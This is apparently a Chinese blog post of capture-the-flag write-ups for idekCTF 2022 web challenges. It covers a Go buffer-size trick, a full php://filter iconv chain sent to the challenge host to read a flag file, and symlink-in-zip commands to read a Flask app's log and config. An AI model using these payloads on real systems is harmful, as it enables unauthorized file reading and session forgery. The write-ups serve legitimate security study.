<!DOCTYPE html>
<html lang="zh-CN">
    
    <head>
    <meta charset="utf-8">
    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0,  viewport-fit=cover" name="viewport" />
    <meta name="description" content="idekctf2022çš„éƒ¨åˆ†web" />
    <meta name="hexo-theme-A4" content="v1.8.2" />
    <link rel="alternate icon" type="image/webp" href="/img/favicon.webp">
    <title>v2ish1yan</title>

    
        
<link rel="stylesheet" href="/css/a11y-dark.min.css">

        
<link rel="stylesheet" href="/css/reset.css">

        
<link rel="stylesheet" href="/css/markdown.css">

        
<link rel="stylesheet" href="/css/fonts.css">
 
         <!--æ³¨æ„ï¼šé¦–é¡µæ—¢ä¸æ˜¯postä¹Ÿä¸æ˜¯page-->
        
            
<link rel="stylesheet" href="/css/waline.css">

        
        
        
<link rel="stylesheet" href="/css/ui.css">
 
        
<link rel="stylesheet" href="/css/style.css">


        
            <!--è¿”å›é¡¶éƒ¨css-->
            
<link rel="stylesheet" href="/css/returnToTop.css">

            
<link rel="stylesheet" href="/css/unicons.css">

        
        
            <!--ç›®å½•-->
            
<link rel="stylesheet" href="/css/toc.css">

        
    
    

<meta name="generator" content="Hexo 6.3.0"></head>
    
    <style>
        :root {
            --waline-theme-color: #000000; 
            --waline-color: #000000; 
            --waline-border-color: #000000; 
            --waline-white: #000000; 
            --waline-bgcolor-light: #ffffff;  
        }
        body {
            color: #000000;
            background: #e4e4e4;
        }
        .post-md code {
            background: #212425;
            color: white; 
        }
        .year-font-color {
            color: #000000 !important;
        }
        .wl-card span.wl-nick {
            color: #000000; 
        }
        .wl-card .wl-badge {
            border: 1px solid #000000;
            color: #000000; 
        }
        .wl-btn {
            border: 1px solid #000000; 
            color:  #000000;  
        }
        .wl-btn.primary {
            color: #ffffff; 
        }
        .wl-header label {
            color: #000000;
        }
        a {
            color: rgb(239, 112, 96);
        }

        .post-md a {
            color: rgb(239, 112, 96);
        }

        .nav li a {
            color: rgb(239, 112, 96);
        }

        .archive-main a:link {
            color: rgb(239, 112, 96);
        }
        .archive-main a:visited {
            color: rgb(239, 112, 96); 
        }

        .archive li span {
            color: #000000;
        }

        .post-main-title {
            color: #000000;
        }

        .post-md h1,
        .post-md h2,
        .post-md h3,
        .post-md h4,
        .post-md h5,
        .post-md h6 {
            color: #000000;
        }

        [data-waline] p {
            color: #000000;
        }
        [data-waline] a {
            color: #000000;
        } 
        .wl-sort li.active {
            color: #000000;
        }

        .wl-card .wl-meta>span {
            background: #ffffff;
        }

        .paper {
            background: #e4e4e4;
        }

        .index-main {
            background: #ffffff;
        }

        .paper-main {
            background: #ffffff;
        }

        .wl-panel {
            background: #ffffff;
        }

        .archive li:nth-child(odd) {
            background: #ffffff;
            ;
        }

        .archive li:nth-child(even) {
            background: #ffffff;
        }

        .post-md>table tr:nth-child(odd) td {
            background: #ffffff;
        }

        .post-md>table tr:nth-child(even) td {
            background: #ffffff;
        }

    
        .progress-wrap::after {
            color: #000000; /* ç®­å¤´çš„é¢œè‰² */
        }
        .progress-wrap svg.progress-circle path {
	        stroke: #000000; /* è¾¹æ¡†çš„é¢œè‰² */
        }
        .progress-wrap::before {
	        background-image: linear-gradient(298deg, rgb(239, 112, 96), rgb(239, 112, 96)); /* é¼ æ ‡æ»‘è¿‡çš„ç®­å¤´é¢œè‰² */
         }

         .left-toc-container::-webkit-scrollbar-thumb {
            background-color: #000000; /* è®¾ç½®æ»šåŠ¨æ¡æ‹–åŠ¨å—çš„é¢œè‰² */
        }

        .bs-docs-sidebar .nav>.active>a,
        .bs-docs-sidebar .nav>li>a:hover,
        .bs-docs-sidebar .nav>li>a:focus {
            color: rgb(239, 112, 96);
            border-left-color: rgb(239, 112, 96);
        }
        .bs-docs-sidebar .nav>li>a {
            color:  #000000;
        }
    </style>

    
    <body>
        
            <div class="left-toc-container">
                <nav id="toc" class="bs-docs-sidebar"></nav>
            </div>
        
        <div class="paper">
            
            
            
            
                <div class="shadow-drop-2-bottom paper-main">
                    
<div class="header">
    <div class="header-container">
        <img style="
        width: 56px;
        height: auto;" alt="^-^" cache-control="max-age=86400" class="header-img" src="/img/favicon.webp" width="10%"></img>
        <div class="header-content">
            <a class="logo" href="/">v2ish1yan</a> 
            <span class="description">ä¸€åˆ‡éƒ½æ˜¯å…´è¶£ä½¿ç„¶</span> 
        </div>
        
    </div>
    
   
    <ul class="nav">
        
            
                <li><a href="/">é¦–é¡µ</a></li>
            
        
            
                <li><a href="/list/">æ–‡ç« </a></li>
            
        
            
                <li><a href="/tags/">æ ‡ç­¾</a></li>
            
        
            
                <li><a href="/categories/">åˆ†ç±»</a></li>
            
        
            
                <li><a href="/about/">å…³äº</a></li>
            
        
            
                <li><a href="/friends/">å‹é“¾</a></li>
            
        
    </ul>
</div> 
        
                    
                    

                    
                    
                    
                    <!--è¯´æ˜æ˜¯æ–‡ç« posté¡µé¢-->
                    
                        <div class="post-main">

    
        <div class="post-main-title">
            idekctf2022çš„éƒ¨åˆ†web
        </div>
      
    

    <div class="post-md">
        
            
                <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#%E5%89%8D%E8%A8%80"><span class="post-toc-text">å‰è¨€</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Web-x2F-Readme"><span class="post-toc-text">Web&#x2F;Readme</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x00"><span class="post-toc-text">0x00</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x01-%E9%A2%98%E8%A7%A3"><span class="post-toc-text">0x01 é¢˜è§£</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Web-x2F-Paywall-%E5%A4%8D%E7%8E%B0"><span class="post-toc-text">Web&#x2F;Paywall(å¤ç°)</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x00-1"><span class="post-toc-text">0x00</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x01-%E9%A2%98%E8%A7%A3-1"><span class="post-toc-text">0x01 é¢˜è§£</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Web-x2F-SimpleFileServe-%E5%A4%8D%E7%8E%B0"><span class="post-toc-text">Web&#x2F;SimpleFileServe(å¤ç°)</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x00-2"><span class="post-toc-text">0x00</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x01-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90"><span class="post-toc-text">0x01 æºç åˆ†æ</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x02-%E9%A2%98%E8%A7%A3"><span class="post-toc-text">0x02 é¢˜è§£</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Web-x2F-task-manager-%E5%A4%8D%E7%8E%B0"><span class="post-toc-text">Web&#x2F;task manager(å¤ç°)</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x00-3"><span class="post-toc-text">0x00</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E9%80%9A%E8%BF%87TaskManager%E5%BE%97%E5%88%B0app%E5%AF%B9%E8%B1%A1"><span class="post-toc-text">é€šè¿‡TaskManagerå¾—åˆ°appå¯¹è±¡</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x01-%E9%80%9A%E8%BF%87eval%E8%BF%9B%E8%A1%8Crce"><span class="post-toc-text">0x01 é€šè¿‡evalè¿›è¡Œrce</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E9%87%8D%E5%A4%8D%E8%B0%83%E7%94%A8-app-before-first-request"><span class="post-toc-text">é‡å¤è°ƒç”¨@app.before_first_request</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="post-toc-text">ä»»æ„æ–‡ä»¶è¯»å–</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E4%BF%AE%E6%94%B9%E9%97%AD%E5%90%88%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="post-toc-text">ä¿®æ”¹é—­åˆå­—ç¬¦ä¸²</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E5%AF%BB%E6%89%BE%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E7%9A%84%E6%96%87%E4%BB%B6%EF%BC%8C%E5%B9%B6%E8%AE%BE%E7%BD%AE%E9%97%AD%E5%90%88%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="post-toc-text">å¯»æ‰¾å¯ä»¥åˆ©ç”¨çš„æ–‡ä»¶ï¼Œå¹¶è®¾ç½®é—­åˆå­—ç¬¦ä¸²</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#exp"><span class="post-toc-text">exp</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x02-%E9%80%9A%E8%BF%87%E8%A6%86%E7%9B%96%E7%BC%96%E8%AF%91%E6%97%B6%E9%9C%80%E8%A6%81%E7%9A%84%E5%80%BC%E8%BF%9B%E8%A1%8Crce"><span class="post-toc-text">0x02 é€šè¿‡è¦†ç›–ç¼–è¯‘æ—¶éœ€è¦çš„å€¼è¿›è¡Œrce</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Web-x2F-Proxy-Viewer-%E5%A4%8D%E7%8E%B0"><span class="post-toc-text">Web&#x2F;Proxy Viewer(å¤ç°)</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x00-4"><span class="post-toc-text">0x00</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x01-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-1"><span class="post-toc-text">0x01 æºç åˆ†æ</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x02-%E9%A2%98%E8%A7%A3-1"><span class="post-toc-text">0x02 é¢˜è§£</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x03-downgrade%E5%A4%A7%E5%93%A5%E7%9A%84wp%E5%92%8Cexp"><span class="post-toc-text">0x03 downgradeå¤§å“¥çš„wpå’Œexp</span></a></li></ol></li></ol>
            
        
        <h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>æˆ‘çˆ±idekctfï¼ï¼ï¼ï¼æœ‰dockerfileçœŸæ˜¯å¤ªæ£’äº†</p>
<p>å› ä¸ºå®åœ¨ä¸ä¼šå‰ç«¯ï¼Œæ‰€ä»¥æš‚æ—¶åªå¤ç°éxssçš„é¢˜ç›®</p>
<p>é¢˜ç›®é™„ä»¶æˆ‘éƒ½æ”¾åœ¨äº†<a target="_blank" rel="noopener" href="https://github.com/v2ish1yan/ctf-attachments">è¿™å„¿</a></p>
<h1 id="Web-x2F-Readme"><a href="#Web-x2F-Readme" class="headerlink" title="Web&#x2F;Readme"></a>Web&#x2F;Readme</h1><h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>ä¸€ä¸ªä»£ç å®¡è®¡é¢˜ï¼Œç”¨çš„goè¯­è¨€ï¼Œå¹³å¸¸æ¥è§¦çš„ä¸å¤šï¼Œçœ‹äº†å¾ˆä¹…çš„æ–‡æ¡£ï¼Œæ‰€ä»¥åšçš„æœ‰äº›æ…¢</p>
<p>å‚è€ƒæ–‡ç« :</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://pkg.go.dev/">Go packages</a></li>
</ul>
<h2 id="0x01-é¢˜è§£"><a href="#0x01-é¢˜è§£" class="headerlink" title="0x01 é¢˜è§£"></a>0x01 é¢˜è§£</h2><p>è¿™é‡Œä¸»è¦æ˜¯è¦è®©ä»randomDataé‡Œè¯»å–åˆ°çš„åˆ‡ç‰‡åˆšå¥½ç­‰äºpassword</p>
<p>è¿™ä¸ªpasswordçš„å€¼æ˜¯å›ºå®šçš„ï¼Œè€Œä¸”åŸç”ŸrandomDataçš„å€¼ä¹Ÿæ˜¯å›ºå®šçš„</p>
<p>ä»ä¸€ä¸‹ä»£ç å¯ä»¥çŸ¥é“ï¼Œé¢˜ç›®å°†passwordçš„å€¼æ”¾è¿›äº†randomData[12625:]åˆ‡ç‰‡</p>
<pre><code class="go">func initRandomData() &#123; //åˆå§‹åŒ–éšæœºæ•°
    rand.Seed(1337)
    randomData = make([]byte, 24576)
    if _, err := rand.Read(randomData); err != nil &#123;
        panic(err)
    &#125;
    copy(randomData[12625:], password[:])
&#125;
</code></pre>
<p>ç„¶ååé¢çš„ä»£ç å°±æ˜¯æ ¹æ®ä½ è¾“å…¥çš„å€¼ï¼Œç„¶åä¾æ¬¡æ ¹æ®ç´¢å¼•å€¼åœ¨randomDataè¯»å–æ•°æ®ï¼Œæœ€åä¸€æ¬¡æ˜¯è¯»å–32ä½ï¼Œå°±åˆšå¥½å’Œpasswordçš„é•¿åº¦ä¸€æ ·</p>
<p>ä¼ å…¥æ•°æ®çš„æ ¼å¼ä¸º</p>
<pre><code class="bash">&#123;&quot;orders&quot;:[1,2,3,xxx]&#125;
</code></pre>
<p>æ•°ç»„è¦æ±‚å…ƒç´ ä¸ªæ•°ä¸å¤šäº10ä¸ªï¼Œä¸”å¤§å°åœ¨å¤§äº0å°äºç­‰äº100</p>
<p>è€Œä¸”æˆ‘ä»¬æœ€ç»ˆè¦å¾—åˆ°çš„æ•°æ®ç´¢å¼•å€¼åœ¨12625ï¼Œè¿™ä¹ˆå°çš„æ•°æ®å†æ€ä¹ˆåŠ éƒ½ä¸å¯èƒ½åˆ°12625</p>
<p>æºç ä¸­æœ‰ä¸€ä¸ªå…³é”®çš„ä»£ç ï¼Œåœ¨<code>GetValidatorCtxData()</code>ä¸­</p>
<pre><code class="go">func GetValidatorCtxData(ctx context.Context) (io.Reader, int) &#123;
    reader := ctx.Value(reqValReaderKey).(io.Reader)
    size := ctx.Value(reqValSizeKey).(int)
    if size &gt;= 100 &#123;
        reader = bufio.NewReader(reader)
    &#125;
    return reader, size
&#125;
</code></pre>
<p>å¦‚æœsize&gt;&#x3D;100ï¼Œå°±ç”¨bufio.NewReader()æ¥æ–°å»ºReaderï¼Œå¹¶ä¸”å…¶ç¼“å†²åŒºå¤§å°é»˜è®¤ä¸º4096</p>
<p>è¿™æ ·å°±å¥½åŠäº†ï¼Œå°±å˜æˆäº†æ•°å­¦é¢˜</p>
<p>æ‰€ä»¥å½“æˆ‘ä»¬ä¼ å…¥100çš„æ—¶å€™ï¼Œè¿™é‡Œè¿”å›çš„readeré‡Œçš„bufçš„å€¼å°±ä¼šå˜æˆ4096</p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301141655010.png" alt="image-20230114165511864"></p>
<p>æœ€åä¼ å…¥è¿™é‡Œ</p>
<pre><code class="go">func (r *Reader) Read(b []byte) (n int, err error) &#123;
    if r.i &gt;= int64(len(r.s)) &#123;
        return 0, io.EOF
    &#125;
    r.prevRune = -1
    n = copy(b, r.s[r.i:])
    r.i += int64(n)
    return
&#125;
</code></pre>
<p>è¿™é‡Œçš„nè¢«ä¸º<code>copy(b, r.s[r.i:])</code>æˆåŠŸå¤åˆ¶çš„ä¸ªæ•°ï¼Œåˆå› ä¸ºbçš„å¤§å°ä¸º4096ï¼Œæ‰€ä»¥nä¼šå˜æˆ4096ã€‚</p>
<p>r.iæœ€å¼€å§‹ä¸º0ï¼Œç„¶åä¼šåŠ ä¸Š4096</p>
<p>æ‰€ä»¥æ¯ä¸€æ¬¡æ‰§è¡Œåˆ°è¿™é‡Œçš„æ—¶å€™ï¼Œå¦‚æœæˆ‘ä»¬æœ€å¼€å§‹ä¼ å…¥çš„å€¼ä¸º100ï¼Œé‚£ä¹ˆè¿™é‡Œå°±ä¼šåŠ ä¸Š4096</p>
<p>åˆ°è¿™é‡Œå°±å¯ä»¥è¿›è¡Œç®—æœ¯é¢˜äº†</p>
<p>è™½ç„¶æœ€åé¢å­˜åœ¨ä¸€ä¸ª</p>
<pre><code class="go">buf, err := v.Read(WithValidatorCtx(ctx, r, 32))
</code></pre>
<p>ä½†æ˜¯è¿™ä¸ªåªæ˜¯ç”¨æ¥å–32ä¸ªå€¼ç”¨çš„ï¼Œæ‰€ä»¥æ²¡å•¥å½±å“</p>
<p>(12625-32)mod4096&#x3D;305</p>
<p>305&#x3D;5*61</p>
<p>æ‰€ä»¥æœ€åçš„payload</p>
<pre><code class="bash">&#123;&quot;orders&quot;:[61,61,61,61,61,100,100,100,32]&#125;
</code></pre>
<p>è¿˜å¯ä»¥æ˜¯</p>
<pre><code class="bash">&#123;&quot;orders&quot;:[60,60,60,60,60,100,100,100,37]&#125;
</code></pre>
<p>è‡ªå·±ç®—å§</p>
<h1 id="Web-x2F-Paywall-å¤ç°"><a href="#Web-x2F-Paywall-å¤ç°" class="headerlink" title="Web&#x2F;Paywall(å¤ç°)"></a>Web&#x2F;Paywall(å¤ç°)</h1><h2 id="0x00-1"><a href="#0x00-1" class="headerlink" title="0x00"></a>0x00</h2><p>ä½¿ç”¨php:&#x2F;&#x2F;filteræ¥æ„é€ å­—ç¬¦ä¸²</p>
<p>å‚è€ƒæ–‡ç« ï¼š</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://tttang.com/archive/1395/#toc_iconv-filter-chain">hxp CTF 2021 - The End Of LFI?</a></li>
<li><a target="_blank" rel="noopener" href="https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d">Solving â€œincluderâ€™s revengeâ€ from hxp ctf 2021 without controlling any files</a></li>
<li>[ctftime&#96;s wp](<a target="_blank" rel="noopener" href="https://ctftime.org/writeup/36071">https://ctftime.org/writeup/36071</a>)</li>
</ul>
<p>å·¥å…·:</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/synacktiv/php_filter_chain_generator">php_filter_chain_generator</a></li>
</ul>
<h2 id="0x01-é¢˜è§£-1"><a href="#0x01-é¢˜è§£-1" class="headerlink" title="0x01 é¢˜è§£"></a>0x01 é¢˜è§£</h2><p>æºç :</p>
<pre><code class="php">&lt;?php

    error_reporting(0);
set_include_path(&#39;articles/&#39;);

if (isset($_GET[&#39;p&#39;])) &#123;
    $article_content = file_get_contents($_GET[&#39;p&#39;], 1);
    echo $article_content;

    if (strpos($article_content, &#39;PREMIUM&#39;) === 0) &#123;
        die(&#39;Thank you for your interest in The idek Times, but this article is only for premium users!&#39;); // TODO:
    &#125;
    else if (strpos($article_content, &#39;FREE&#39;) === 0) &#123;
        echo &quot;&lt;article&gt;$article_content&lt;/article&gt;&quot;;
        die();
    &#125;
    else &#123;
        die(&#39;nothing here&#39;);
    &#125;
&#125;

?&gt;
</code></pre>
<p>è¿™é‡Œå°±æ˜¯è¦è®©æˆ‘ä»¬åŒ…å«çš„æ–‡ä»¶ä»¥FREEå¼€å¤´æ‰ä¼šæ‰“å°å‡ºæ¥ï¼Œä½¿ç”¨php:&#x2F;&#x2F;filteré€šè¿‡å­—ç¬¦é›†çš„è½¬å˜æ¥æ„é€ å­—ç¬¦ä¸²â€™FREEâ€™</p>
<p>ä½¿ç”¨è¿™ä¸ªå·¥å…·ï¼ˆgithub:<a target="_blank" rel="noopener" href="https://github.com/synacktiv/php_filter_chain_generator">php_filter_chain_generator</a>)</p>
<p>FREEåé¢æœ‰ä¸¤ä¸ªç©ºæ ¼</p>
<pre><code class="bash">python3 php_filter_chain_generator.py --chain &quot;FREE  &quot;
</code></pre>
<p>å¾—åˆ°</p>
<pre><code class="bash">php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.I
BM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode
|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.icon
v.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|
convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|
convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32L
E|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=flag
</code></pre>
<p>å‘é€payload:</p>
<pre><code class="bash">http://paywall.chal.idek.team:1337/?p=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.I
BM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode
|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.icon
v.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|
convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|
convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32L
E|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=flag
</code></pre>
<p>å¾—åˆ°</p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301172119246.png" alt="image-20230117211940137"></p>
<h1 id="Web-x2F-SimpleFileServe-å¤ç°"><a href="#Web-x2F-SimpleFileServe-å¤ç°" class="headerlink" title="Web&#x2F;SimpleFileServe(å¤ç°)"></a>Web&#x2F;SimpleFileServe(å¤ç°)</h1><h2 id="0x00-2"><a href="#0x00-2" class="headerlink" title="0x00"></a>0x00</h2><p>é¢˜ç›®ç¯å¢ƒæ˜¯flask</p>
<p>è¦æˆ‘ä»¬çˆ†ç ´å¾—åˆ°secret_key,æ¥ä¼ªé€ session</p>
<p>åˆ©ç”¨ç¬¦å·é“¾æ¥æ–‡ä»¶æ¥è·å¾—ç‰¹å®šæ–‡ä»¶</p>
<p>å‚è€ƒæ–‡ç« :</p>
<ul>
<li>[Alberto FDR&#96;s write up](<a target="_blank" rel="noopener" href="https://albertofdr.github.io/post/ctf-idek-2023/">https://albertofdr.github.io/post/ctf-idek-2023/</a>)</li>
</ul>
<p>å·¥å…·:</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/Paradoxis/Flask-Unsign">Flask-Unsign</a></li>
</ul>
<h2 id="0x01-æºç åˆ†æ"><a href="#0x01-æºç åˆ†æ" class="headerlink" title="0x01 æºç åˆ†æ"></a>0x01 æºç åˆ†æ</h2><p>é¢˜ç›®<code>dockerfile</code></p>
<pre><code class="dockerfile">COPY src/ /app
WORKDIR /app

RUN chmod 4755 flag
RUN chmod 600 flag.txt

USER nobody

CMD bash -c &quot;mkdir /tmp/uploadraw /tmp/uploads &amp;&amp; sqlite3 /tmp/database.db \&quot;CREATE TABLE users(username text, password text, admin boolean)\&quot; &amp;&amp; /usr/local/bin/gunicorn --bind 0.0.0.0:1337 --config config.py --log-file /tmp/server.log wsgi:app&quot;
</code></pre>
<p>è¿™é‡Œæ˜¯åˆ†åˆ«èµ‹äºˆäº†flag.txt 600çš„æƒé™ï¼Œåªæœ‰rootå¯ä»¥è¯»å†™</p>
<p>å°†gunicornçš„logæ–‡ä»¶è®¾ç½®ä¸º&#x2F;tmp&#x2F;server.log</p>
<p>ä½¿ç”¨config.pyä½œä¸ºé…ç½®æ–‡ä»¶</p>
<p><code>config.py</code></p>
<pre><code class="python">import random
import os
import time

SECRET_OFFSET = 0 # REDACTED
random.seed(round((time.time() + SECRET_OFFSET) * 1000))
os.environ[&quot;SECRET_KEY&quot;] = &quot;&quot;.join([hex(random.randint(0, 15)) for x in range(32)]).replace(&quot;0x&quot;, &quot;&quot;)
</code></pre>
<p>è¿™é‡Œå‘Šè¯‰äº†æˆ‘ä»¬secret_keyæ˜¯å¦‚ä½•ç”Ÿæˆçš„</p>
<p>è¿™é‡Œä½¿ç”¨äº†random.seed()æ¥è®¾ç½®éšæœºæ•°ç§å­ï¼Œåªè¦å‚æ•°ä¸€æ ·ï¼Œrandint()è·å¾—çš„æ•°å€¼éƒ½æ˜¯ä¸€æ ·çš„ï¼Œæ‰€ä»¥åªè¦å¾—åˆ°äº†é¢˜ç›®å½“æ—¶çš„ç§å­ï¼Œå°±å¯ä»¥çˆ†ç ´å‡ºsecret_key</p>
<p>è€Œåœ¨random.seedé‡Œï¼Œæ˜¯ä½¿ç”¨äº†<code>time.time()</code>ä½œä¸ºå‚æ•°çš„å†…å®¹ä¹‹ä¸€</p>
<blockquote>
<p>time.time()è¿”å›å½“å‰æ—¶é—´çš„æ—¶é—´æˆ³ï¼ˆ1970çºªå…ƒåç»è¿‡çš„æµ®ç‚¹ç§’æ•°ï¼‰</p>
</blockquote>
<p>ç„¶åå°†æœ€ç»ˆçš„ç»“æœä½¿ç”¨<code>round()</code>å››èˆäº”å…¥å–æ•´</p>
<p><code>app.py</code></p>
<p>å…³é”®ä»£ç </p>
<pre><code class="python">    file = request.files[&quot;file&quot;]
    uuidpath = str(uuid.uuid4())
    filename = f&quot;&#123;DATA_DIR&#125;uploadraw/&#123;uuidpath&#125;.zip&quot;
    file.save(filename)
    subprocess.call([&quot;unzip&quot;, filename, &quot;-d&quot;, f&quot;&#123;DATA_DIR&#125;uploads/&#123;uuidpath&#125;&quot;])    
    flash(f&#39;Your unique ID is &lt;a href=&quot;/uploads/&#123;uuidpath&#125;&quot;&gt;&#123;uuidpath&#125;&lt;/a&gt;!&#39;, &quot;success&quot;)
    logger.info(f&quot;User &#123;session.get(&#39;uid&#39;)&#125; uploaded file &#123;uuidpath&#125;&quot;)
    return redirect(&quot;/upload&quot;)
</code></pre>
<p>è¿™é‡Œæ˜¯åœ¨å°†æ–‡ä»¶ä¸Šä¼ åå†è¿›è¡Œè§£å‹åˆ°<code>&#123;DATA_DIR&#125;uploads/&#123;uuidpath&#125;</code>æ–‡ä»¶å¤¹</p>
<p>è¿™é‡Œè§£å‹çš„æ–¹å¼æ˜¯ä½¿ç”¨unzipï¼Œè€Œzipæä¾›äº†å‹ç¼©ç¬¦å·é“¾æ¥æ–‡ä»¶çš„æ–¹æ³•<code> zip --symlinks a.zip a.link</code></p>
<h2 id="0x02-é¢˜è§£"><a href="#0x02-é¢˜è§£" class="headerlink" title="0x02 é¢˜è§£"></a>0x02 é¢˜è§£</h2><p>æ ¹æ®ä¸Šé¢çš„åˆ†æ</p>
<p>æˆ‘ä»¬éœ€è¦è·å¾—å½“æ—¶çš„<code>æ—¶é—´æˆ³</code>ä»¥åŠ<code>SECRET_OFFSET</code>çš„å€¼</p>
<p>æ‰€ä»¥æˆ‘ä»¬è¦å»è·å–config.pyå’Œserver.logï¼ˆå› ä¸ºè¿™ä¸ªæ˜¯æ—¥å¿—æ–‡ä»¶ï¼Œè®°å½•äº†æœåŠ¡å¼€å¯çš„æ—¶é—´ï¼Œè€Œåœ¨æœåŠ¡å¼€å¯çš„æ—¶å€™å°±æ˜¯æ‰§è¡Œconfig.pyä»£ç çš„æ—¶å€™ï¼‰</p>
<pre><code class="bash">ln -s /tmp/server.log server
zip --symlinks server.zip server
ln -s /app/config.py config
zip --symlinks config.zip config
</code></pre>
